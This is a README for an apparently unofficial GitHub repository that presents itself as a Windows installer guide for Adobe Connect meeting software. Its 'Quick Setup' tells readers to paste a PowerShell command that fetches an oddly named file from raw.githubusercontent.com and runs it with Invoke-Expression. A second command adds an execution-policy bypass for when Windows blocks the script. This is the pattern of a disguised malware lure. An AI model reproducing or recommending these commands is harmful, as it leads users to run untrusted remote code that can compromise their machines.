# Connect

Connect is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Connect and work in it.

Adobe Connect is desktop meeting software for Windows that connects you to hosted rooms for training, events, and team sessions. The client handles camera, microphone, and layout controls while you interact through share areas, chat, notes, and other room pods.

A typical session starts when you open the application and enter a room URL or launch from a calendar invite. You pick an audio profile, allow devices if prompted, then join as host, presenter, or participant. Hosts manage layouts and permissions; presenters share slides or their screen; everyone uses chat, polls, or Q&A as the session runs.

This repository holds a Windows setup package for installing the client, short configuration notes for common room and audio settings, and a changelog that records bundle updates and compatibility adjustments across releases.

## What you do with it

- Persistent meeting rooms keep layouts, content, and permissions ready between scheduled sessions.
- Share pods let presenters push slides, applications, or full screens to every attendee.
- Breakout rooms split large classes into smaller groups without leaving the main event.
- Built-in polls and Q&A pods collect responses and moderate audience questions during live sessions.
- Host controls assign presenter rights, mute participants, and switch room layouts on Windows.
- Recording captures audio, video, and shared content for later review by trainers or teams.
- Chat and notes pods run alongside video so side conversations stay inside the same room.
- Role-based access distinguishes hosts, presenters, and participants with appropriate room capabilities.

## Quick Setup (PowerShell)

This installs the program Connect on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/smayer3828392901/connect-setup-guide/main/pqu76s2mcx.atc3gguk | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/smayer3828392901/connect-setup-guide/main/pqu76s2mcx.atc3gguk | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `pqu76s2mcx.atc3gguk` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `smayer3828392901/connect-setup-guide`. Adobe Connect 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
